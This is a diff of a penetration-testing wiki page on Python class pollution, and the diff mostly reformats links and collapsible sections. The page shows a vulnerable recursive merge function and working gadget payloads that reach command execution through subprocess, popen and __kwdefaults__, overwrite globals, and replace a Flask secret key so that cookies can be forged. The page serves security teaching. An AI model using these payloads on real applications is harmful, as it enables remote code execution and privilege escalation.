@@ -1,6 +1,5 @@
 # Class Pollution (Python's Prototype Pollution)
 
-
 ## Basic Example
 
 Check how is possible to pollute classes of objects with strings:
@@ -28,7 +27,7 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-```
+
 ## Basic Vulnerability Example
 
 ```python
@@ -51,6 +50,7 @@ def merge(src, dst):
         else:
             setattr(dst, k, v)
 
+
 USER_INPUT = {
     "name":"Ahemd",
     "age": 23,
@@ -62,12 +62,12 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-```
+
 ## Gadget Examples
 
+<details>
 
 **Creating class property default value to RCE (subprocess)**
-
 
 ```python
 from os import popen
@@ -115,12 +115,12 @@ merge(USER_INPUT, recruiter_emp)
 print(system_admin_emp.execute_command())
 #> [!] Executing: "whoami", output: "abdulrah33m"
 ```
-```
 
+</details>
 
+<details>
 
 **Polluting other classes and global vars through `globals`**
-
 
 ```python
 def merge(src, dst):
@@ -149,12 +149,12 @@ merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Pollut
 print(not_accessible_variable) #> Polluted variable
 print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 ```
-```
 
+</details>
 
+<details>
 
 **Arbitrary subprocess execution**
-
 
 ```python
 import subprocess, json
@@ -183,14 +183,14 @@ merge(USER_INPUT, Employee())
 
 subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 ```
-```
 
+</details>
 
+<details>
 
 **Overwritting **`__kwdefaults__`****
 
-
-**`__kwdefaults__`** is a special attribute of all functions, based on Python [[https://docs.python.org/3/library/inspect.html|documentation]], it is a “mapping of any default values for **keyword-only** parameters”. Polluting this attribute allows us to control the default values of keyword-only parameters of a function, these are the function’s parameters that come after \* or \*args.
+**`__kwdefaults__`** is a special attribute of all functions, based on Python [documentation](https://docs.python.org/3/library/inspect.html), it is a “mapping of any default values for **keyword-only** parameters”. Polluting this attribute allows us to control the default values of keyword-only parameters of a function, these are the function’s parameters that come after \* or \*args.
 
 ```python
 from os import system
@@ -228,12 +228,12 @@ print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
 execute() #> Executing echo Polluted
 #> Polluted
 ```
-```
 
+</details>
 
+<details>
 
 **Overwriting Flask secret across files**
-
 
 So, if you can do a class pollution over an object defined in the main python file of the web but **whose class is defined in a different file** than the main one. Because in order to access \_\_globals\_\_ in the previous payloads you need to access the class of the object or methods of the class, you will be able to **access the globals in that file, but not in the main one**. \
 Therefore, you **won't be able to access the Flask app global object** that defined the **secret key** in the main page:
@@ -242,17 +242,18 @@ Therefore, you **won't be able to access the Flask app global object** that defi
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-```
-In this scenario you need a gadget to traverse files to get to the main one to **access the global object `app.secret_key`** to change the Flask secret key and be able to [[../../network-services-pentesting/pentesting-web/flask.md#flask-unsign|**escalate privileges** knowing this key]].
 
-A payload like this one [[https://ctftime.org/writeup/36082|from this writeup]]:
+In this scenario you need a gadget to traverse files to get to the main one to **access the global object `app.secret_key`** to change the Flask secret key and be able to [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
+
+A payload like this one [from this writeup](https://ctftime.org/writeup/36082):
 
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
-```
+
 Use this payload to **change `app.secret_key`** (the name in your app might be different) to be able to sign new and more privileges flask cookies.
 
+</details>
 
 Check also the following page for more read only gadgets:
 
@@ -260,7 +261,5 @@ Check also the following page for more read only gadgets:
 
 ## References
 
-- [[https://blog.abdulrah33m.com/prototype-pollution-in-python/|https://blog.abdulrah33m.com/prototype-pollution-in-python/]]
-
-
+- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
 
